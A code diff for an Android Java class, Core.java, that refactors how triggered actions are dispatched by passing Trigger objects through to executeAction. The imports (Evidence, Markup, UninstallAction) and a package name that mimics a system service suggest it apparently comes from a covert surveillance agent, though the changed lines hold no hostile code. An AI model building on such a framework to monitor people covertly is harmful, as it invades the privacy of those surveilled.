@@ -21,6 +21,7 @@ import com.android.service.action.UninstallAction;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
+import com.android.service.event.BaseEvent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
@@ -219,16 +220,16 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
-				final int[] actionIds = status.getTriggeredActions(qq);
+				final Trigger[] actionIds = status.getTriggeredActions(qq);
 
 				if(actionIds.length == 0){
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
 					}
 				}
-				for (final int actionId : actionIds) {
-					final Action action = status.getAction(actionId);
-					final Exit exitValue = executeAction(action);
+				for (final Trigger trigger : actionIds) {
+					final Action action = status.getAction(trigger.getActionId());
+					final Exit exitValue = executeAction(action, trigger);
 
 					if (exitValue == Exit.UNINSTALL) {
 						if (Cfg.DEBUG) {
@@ -466,9 +467,10 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @param action
 	 *            the action
+	 * @param baseEvent 
 	 * @return the int
 	 */
-	private Exit executeAction(final Action action) {
+	private Exit executeAction(final Action action, Trigger trigger) {
 		Exit exit = Exit.SUCCESS;
 
 		if (Cfg.DEBUG) {
@@ -498,7 +500,7 @@ public class Core extends Activity implements Runnable {
 				}
 
 				subAction.prepareExecute();
-				final boolean ret = subAction.execute();
+				final boolean ret = subAction.execute(trigger);
 
 				if (status.uninstall) {
 					if (Cfg.DEBUG) {
